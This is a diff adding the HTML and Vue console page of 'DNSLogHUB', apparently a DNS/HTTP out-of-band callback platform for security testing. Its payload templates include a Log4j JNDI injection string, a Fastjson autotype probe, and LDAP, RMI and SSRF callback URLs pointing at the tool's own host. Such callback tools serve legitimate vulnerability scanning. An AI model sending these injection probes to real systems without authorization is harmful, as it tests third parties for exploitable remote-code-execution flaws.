@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DNSLogHUB · 控制台</title>
+    <meta name="keywords" content="dnsloghub">
+    <meta name="description" content="dnsloghub">
+    <link rel="stylesheet" href="/css/theme.css">
+</head>
+<body>
+<a class="skip-link" href="#main">跳到主要内容</a>
+
+<div id="app" class="shell">
+    <header>
+        <div class="topbar">
+            <div class="brand">DNSLogHUB<span class="cursor"></span></div>
+            <div class="topbar-actions">
+                <button class="icon-btn" type="button" @click="toggleLang" :aria-label="t('lang_toggle')">
+                    {{ lang === 'zh-CN' ? 'EN' : '中文' }}
+                </button>
+                <button class="icon-btn" type="button" @click="toggleTheme" :aria-label="t('theme_toggle')">
+                    {{ theme === 'dark' ? '浅色' : '深色' }}
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <main id="main">
+        <div class="btn-row" style="margin-bottom:var(--space-4)">
+            <button class="btn" type="button" @click="getDnsData">{{ t('refresh') }}</button>
+            <button class="btn btn-primary" type="button" @click="generatePayload">{{ t('copy') }}</button>
+            <button class="btn btn-danger" type="button" @click="clearRecords">{{ t('clear') }}</button>
+            <button class="btn btn-ghost" type="button" @click="showSettings = !showSettings">{{ showSettings ? t('settings_hide') : t('settings_show') }}</button>
+        </div>
+
+        <div class="panel">
+            <div class="panel-title">{{ t('domain') }}</div>
+            <div class="terminal" id="myDomain"><span class="prompt"></span>{{ randDomain || t('no_domain') }}</div>
+        </div>
+
+        <div class="panel" v-if="randDomain !== ''">
+            <div class="panel-title">{{ t('payload') }}</div>
+            <div class="payload-list">
+                <div class="payload-item" v-for="(item, key) in payload" :key="key">
+                    <span class="key">{{ key }}</span>
+                    <code>{{ item.replace("domain", randDomain) }}</code>
+                </div>
+            </div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-title">{{ t('records') }}</div>
+            <div class="table-wrap">
+                <table class="data">
+                    <thead>
+                    <tr>
+                        <th>{{ t('col_subdomain') }}</th>
+                        <th>{{ t('col_type') }}</th>
+                        <th>{{ t('col_ip') }}</th>
+                        <th>{{ t('col_location') }}</th>
+                        <th>{{ t('col_time') }}</th>
+                    </tr>
+                    </thead>
+                    <tbody>
+                    <tr v-if="!dnsRecords || dnsRecords.length === 0">
+                        <td colspan="5" class="empty">{{ t('no_data') }}</td>
+                    </tr>
+
+                    <template v-for="(item, index) in dnsRecords">
+                        <tr :key="'record-' + index">
+                            <td>
+                                {{ item.Subdomain }}
+                                <a v-if="item.Type && item.Type.toUpperCase() === 'HTTP'"
+                                   href="#"
+                                   @click.prevent="toggleRequest(index)"
+                                   style="font-size:10px;margin-left:6px">
+                                    [{{ item.showReq ? t('collapse') : t('expand') }}]
+                                </a>
+                            </td>
+                            <td><span class="badge" :class="'badge-' + (item.Type || '').toUpperCase()">{{ item.Type }}</span></td>
+                            <td>{{ item.Ipaddress }}</td>
+                            <td>{{ item.IpLocation }}</td>
+                            <td>{{ item.Time }}</td>
+                        </tr>
+                        <tr v-if="item.showReq && item.Type && item.Type.toUpperCase() === 'HTTP'"
+                            :key="'detail-' + index"
+                            style="background:var(--surface-2)">
+                            <td colspan="5">
+                                <div class="panel-title">{{ t('http_req') }}</div>
+                                <pre>{{ item.Request }}</pre>
+                            </td>
+                        </tr>
+                    </template>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="panel" v-if="showSettings">
+            <div class="panel-title">{{ t('settings') }}</div>
+            <div class="field">
+                <label for="newSubdomain">{{ t('settings_subdomain') }}</label>
+                <input class="input" type="text" id="newSubdomain" v-model="newSubdomain" :placeholder="t('settings_subdomain_hint')">
+            </div>
+            <button class="btn" type="button" @click="resetSubdomain">{{ t('settings_submit') }}</button>
+
+            <div class="field" style="margin-top:var(--space-4)">
+                <label for="newToken">{{ t('settings_token') }}</label>
+                <input class="input" type="text" id="newToken" v-model="newToken" :placeholder="t('settings_token_hint')">
+            </div>
+            <button class="btn" type="button" @click="resetToken">{{ t('settings_submit') }}</button>
+        </div>
+    </main>
+
+    <footer class="footer">DNSLogHUB — 多协议安全检测平台</footer>
+</div>
+
+<script src="/js/vue.js"></script>
+<script src="/js/axios.min.js"></script>
+<script src="/js/theme.js"></script>
+<script>
+    const I18N_DICT = {
+        'zh-CN': {
+            lang_toggle: '切换语言',
+            theme_toggle: '切换明暗主题',
+            refresh: '刷新记录',
+            copy: '复制随机子域名',
+            clear: '清空',
+            domain: '你的回调域名',
+            no_domain: '（点击“复制随机子域名”生成）',
+            payload: 'Payload 模板',
+            records: 'DNS 查询记录',
+            col_subdomain: '子域名',
+            col_type: '类型',
+            col_ip: 'IP 地址',
+            col_location: '归属地',
+            col_time: '时间',
+            no_data: '暂无数据',
+            http_req: 'HTTP 报文',
+            expand: '报文',
+            collapse: '收起',
+            copied: '复制成功',
+            copy_fail: '复制失败，请手动复制',
+            token_error: 'Token 错误',
+            verify_fail: '验证失败，请重试',
+            enter_token: '请输入 Token',
+            settings: '账户设置',
+            settings_show: '设置',
+            settings_hide: '收起设置',
+            settings_subdomain: '重置子域名',
+            settings_subdomain_hint: '新的专属子域名',
+            settings_token: '重置 Token',
+            settings_token_hint: '新的认证 Token（8-64 位）',
+            settings_submit: '提交',
+            settings_saved: '已保存',
+            settings_failed: '操作失败'
+        },
+        'en': {
+            lang_toggle: 'Switch language',
+            theme_toggle: 'Toggle theme',
+            refresh: 'Refresh',
+            copy: 'Copy random subdomain',
+            clear: 'Clear',
+            domain: 'Your callback domain',
+            no_domain: '(click "Copy random subdomain" to generate)',
+            payload: 'Payload templates',
+            records: 'DNS query records',
+            col_subdomain: 'Subdomain',
+            col_type: 'Type',
+            col_ip: 'IP Address',
+            col_location: 'IP Location',
+            col_time: 'Time',
+            no_data: 'No data',
+            http_req: 'HTTP request',
+            expand: 'packet',
+            collapse: 'collapse',
+            copied: 'Copied',
+            copy_fail: 'Copy failed, copy manually',
+            token_error: 'Invalid token',
+            verify_fail: 'Verification failed, try again',
+            enter_token: 'Please enter token',
+            settings: 'Account settings',
+            settings_show: 'Settings',
+            settings_hide: 'Hide settings',
+            settings_subdomain: 'Reset subdomain',
+            settings_subdomain_hint: 'New dedicated subdomain',
+            settings_token: 'Reset token',
+            settings_token_hint: 'New auth token (8-64 chars)',
+            settings_submit: 'Submit',
+            settings_saved: 'Saved',
+            settings_failed: 'Operation failed'
+        }
+    };
+
+    const formatTimeToStr = (ts) => {
+        const date = new Date(ts * 1000);
+        const pad = (n) => n.toString().padStart(2, '0');
+        return `${pad(date.getMonth() + 1)}-${pad(date.getDate())} ${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
+    };
+
+    const randomStr = () => {
+        const chars = 'abcdefhijkmnprstwxyz1234567890';
+        return Array.from({ length: 5 }, () =>
+            chars.charAt(Math.floor(Math.random() * chars.length))
+        ).join('');
+    };
+
+    const copyToClipboard = async (text) => {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            try {
+                await navigator.clipboard.writeText(text);
+                return true;
+            } catch (err) {
+                console.warn('Clipboard API failed, falling back to execCommand');
+            }
+        }
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        textarea.style.position = 'fixed';
+        textarea.style.opacity = '0';
+        document.body.appendChild(textarea);
+        textarea.select();
+        const success = document.execCommand('copy');
+        document.body.removeChild(textarea);
+        return success;
+    };
+
+    new Vue({
+        el: '#app',
+        data: {
+            dnsRecords: [],
+            token: '',
+            domain: '',
+            randDomain: '',
+            payload: {
+                'Log4j': '${jndi:ldap://domain:9999/aaa}',
+                'Fastjson': '{"@type":"java.net.Inet4Address","val":"domain"}',
+                'SSRF': '',
+            },
+            refreshTimer: null,
+            recordsMap: new Map(),
+            lang: (function () {
+                try { return localStorage.getItem('dnsloghub-lang') || 'zh-CN'; } catch (e) { return 'zh-CN'; }
+            })(),
+            theme: (window.DNSLogHUB && window.DNSLogHUB.getTheme()) || 'dark',
+            showSettings: false,
+            newSubdomain: '',
+            newToken: '',
+            i18n: I18N_DICT
+        },
+        methods: {
+            t(key) {
+                const m = this.i18n[this.lang] || this.i18n['zh-CN'] || {};
+                return m[key] != null ? m[key] : key;
+            },
+            toggleLang() {
+                this.lang = this.lang === 'zh-CN' ? 'en' : 'zh-CN';
+                try { localStorage.setItem('dnsloghub-lang', this.lang); } catch (e) {}
+            },
+            toggleTheme() {
+                this.theme = (window.DNSLogHUB && window.DNSLogHUB.toggleTheme()) || this.theme;
+            },
+
+            handleAuthError() {
+                alert(this.t('token_error'));
+                localStorage.clear();
+                location.reload();
+            },
+
+            toggleRequest(index) {
+                const record = this.dnsRecords[index];
+                const formattedTime = record.Time;
+                const key = `${record.Subdomain}-${formattedTime}`;
+                const newShowReq = !record.showReq;
+                this.recordsMap.set(key, newShowReq);
+                this.$set(this.dnsRecords[index], 'showReq', newShowReq);
+            },
+
+            async getDnsData() {
+                try {
+                    const res = await axios.get('/api/getDnsData', {
+                        headers: { 'token': this.token }
+                    });
+                    if (res.data.code !== 200) {
+                        this.handleAuthError();
+                        return;
+                    }
+                    if (res.data.data && res.data.data.length > 0) {
+                        this.dnsRecords = res.data.data.map(item => {
+                            const formattedTime = typeof item.Time === 'number'
+                                ? formatTimeToStr(item.Time)
+                                : item.Time;
+                            const key = `${item.Subdomain}-${formattedTime}`;
+                            const showReq = this.recordsMap.get(key) ?? false;
+                            return { ...item, Time: formattedTime, showReq };
+                        });
+                    } else {
+                        this.dnsRecords = [];
+                        this.recordsMap.clear();
+                    }
+                } catch (err) {
+                    if (err.response && err.response.status === 401) {
+                        this.handleAuthError();
+                    } else {
+                        console.error('获取DNS数据失败:', err);
+                    }
+                }
+            },
+
+            async clearRecords() {
+                try {
+                    await axios.get('/api/clean', {
+                        headers: { 'token': this.token }
+                    });
+                    this.dnsRecords = [];
+                    this.recordsMap.clear();
+                } catch (err) {
+                    console.error('清空记录失败:', err);
+                }
+            },
+
+            async resetSubdomain() {
+                const sub = this.newSubdomain.trim();
+                if (!sub) return;
+                try {
+                    const res = await axios.post('/api/user/reset-subdomain', { subdomain: sub }, { headers: { 'token': this.token } });
+                    if (res.data.code === 200) {
+                        alert(this.t('settings_saved'));
+                        this.newSubdomain = '';
+                        await this.verifyToken(this.token);
+                    } else {
+                        alert(res.data.message || this.t('settings_failed'));
+                    }
+                } catch (err) {
+                    alert(this.t('settings_failed'));
+                }
+            },
+
+            async resetToken() {
+                const nt = this.newToken.trim();
+                if (!nt) return;
+                try {
+                    const res = await axios.post('/api/user/reset-token', { token: nt }, { headers: { 'token': this.token } });
+                    if (res.data.code === 200) {
+                        localStorage.setItem('token', nt);
+                        this.token = nt;
+                        this.newToken = '';
+                        alert(this.t('settings_saved'));
+                        await this.verifyToken(nt);
+                    } else {
+                        alert(res.data.message || this.t('settings_failed'));
+                    }
+                } catch (err) {
+                    alert(this.t('settings_failed'));
+                }
+            },
+
+            async generatePayload() {
+                const randDomain = randomStr() + '.' + this.domain;
+                const success = await copyToClipboard(randDomain);
+                if (success) {
+                    const subdomain = this.domain.split('.')[0];
+                    this.payload['SSRF'] = `${location.protocol}//${location.host}/${subdomain}/`;
+                    this.payload['LDAP'] = `ldap://${location.host}/${subdomain}`;
+                    this.payload['RMI'] = `rmi://${location.host}/${subdomain}`;
+                    this.randDomain = randDomain;
+                    alert(this.t('copied'));
+                } else {
+                    alert(this.t('copy_fail'));
+                }
+            },
+
+            async verifyToken(token) {
+                try {
+                    const res = await axios.post('/api/verifyToken', { token });
+                    if (res.data.code === 200) {
+                        this.token = token;
+                        localStorage.setItem('token', token);
+                        this.domain = res.data.data.subdomain;
+                        localStorage.setItem('domain', this.domain);
+                        await this.getDnsData();
+                    } else {
+                        this.handleAuthError();
+                    }
+                } catch (err) {
+                    this.handleAuthError();
+                }
+            }
+        },
+
+        async mounted() {
+            const savedToken = localStorage.getItem('token');
+            if (!savedToken) {
+                const token = prompt(this.t('enter_token'));
+                if (token) {
+                    await this.verifyToken(token);
+                }
+            } else {
+                // 以服务端为权威数据源：总是重新校验并拉取最新子域名，
+                // 避免服务端重启后修改子域名时前端因 localStorage 旧域名取不到数据。
+                this.token = savedToken;
+                await this.verifyToken(savedToken);
+            }
+            this.refreshTimer = setInterval(() => {
+                this.getDnsData();
+            }, 3000);
+        },
+
+        beforeDestroy() {
+            if (this.refreshTimer) {
+                clearInterval(this.refreshTimer);
+            }
+        }
+    });
+</script>
+</body>
+</html>
